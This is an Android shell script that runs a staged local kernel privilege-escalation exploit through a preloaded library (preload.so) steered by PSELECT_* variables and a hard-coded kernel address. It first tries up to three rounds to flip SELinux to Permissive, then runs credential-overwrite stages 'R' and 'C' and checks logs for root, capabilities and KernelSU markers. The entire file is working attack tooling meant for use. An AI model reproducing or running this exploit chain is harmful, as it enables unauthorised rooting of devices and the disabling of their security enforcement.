#!/system/bin/sh
LOG=/data/local/tmp/arc_log.txt
echo "=== ARC start $(date +%H:%M:%S) boot=$(cat /proc/sys/kernel/random/boot_id) enforce=$(getenforce) ===" > $LOG

# ---------- A1: win-recipe flip Permissive (up to 3 rounds) ----------
for i in 1 2 3; do
  echo "--- A1 round$i start $(date +%H:%M:%S) freq=$(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq 2>/dev/null) ---" >> $LOG
  am kill-all 2>/dev/null
  timeout 220 env PSELECT_SLIDE_TRIGGER=1 PSELECT_RETRY=1     PSELECT_TREE_PC=ffffff8002a41b90 PSELECT_TREE_LEFT=0     PSELECT_SKIP_WARMUP=1     LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/A1_$i.out 2>&1
  echo "A1 round$i rc=$? enforce=$(getenforce) boot=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
  [ "$(getenforce)" = "Permissive" ] && { echo ">>> A1 WIN round$i" >> $LOG; break; }
  sleep 2
done
[ "$(getenforce)" != "Permissive" ] && { echo "!! A1 3轮未翻 Permissive" >> $LOG; exit 1; }
echo "### PERMISSIVE OPEN ###" >> $LOG

# ---------- R: STAGE-R with mt56 ----------
echo "--- R start $(date +%H:%M:%S) ---" >> $LOG
am kill-all 2>/dev/null
timeout 220 env   PSELECT_SLIDE_TRIGGER=1   PSELECT_CRED=1 PSELECT_PERF_CRED=1   PSELECT_RETRY=1   PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1   PSELECT_PTR_RIGHT=auto   PSELECT_SKIP_WARMUP=1   PSELECT_WAIT_SECONDS=200   LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/rep_R.out 2>&1
echo "R rc=$? boot=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
grep -a "PTR_RIGHT|mt51|mt55|mid-burst|ROOT-SEEN|CapEff" /data/local/tmp/rep_R.out | sed 's/[[0-9;]*m//g' | head -10 >> $LOG
echo "--- child status: $(cat /data/local/tmp/mt49_child_status.txt 2>/dev/null)" >> $LOG
sleep 5

# ---------- C: STAGE-C (only if R landed, child status has task) ----------
TASK=$(grep -a "^task=" /data/local/tmp/mt49_child_status.txt 2>/dev/null | tail -1 | cut -d= -f2 | tr -d ' ')
if [ -n "$TASK" ] && [ "$TASK" != "0" ]; then
  echo "--- C start $(date +%H:%M:%S) task=$TASK ---" >> $LOG
  am kill-all 2>/dev/null
  timeout 220 env     PSELECT_SLIDE_TRIGGER=1     PSELECT_CRED=1 PSELECT_PERF_CRED=1     PSELECT_RETRY=1     PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1     PSELECT_PTR_RIGHT=auto     PSELECT_SKIP_WARMUP=1     PSELECT_WAIT_SECONDS=200     PSELECT_TASK=$TASK     LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/rep_C.out 2>&1
  echo "C rc=$? boot=$(cat /proc/sys/kernel/random/boot_id)" >> $LOG
  grep -a "PTR_RIGHT|ROOT-SEEN|CapEff|mid-burst" /data/local/tmp/rep_C.out | sed 's/[[0-9;]*m//g' | head -10 >> $LOG
else
  echo "!! C skipped: no task from child status" >> $LOG
fi

echo "=== ARC end $(date +%H:%M:%S) ===" >> $LOG
ls -la /data/local/tmp/root_alive.txt /data/local/tmp/root_marker.txt /data/local/tmp/ksu_done.txt 2>/dev/null >> $LOG
echo "=== final: boot=$(cat /proc/sys/kernel/random/boot_id) enforce=$(getenforce) ===" >> $LOG
cat $LOG
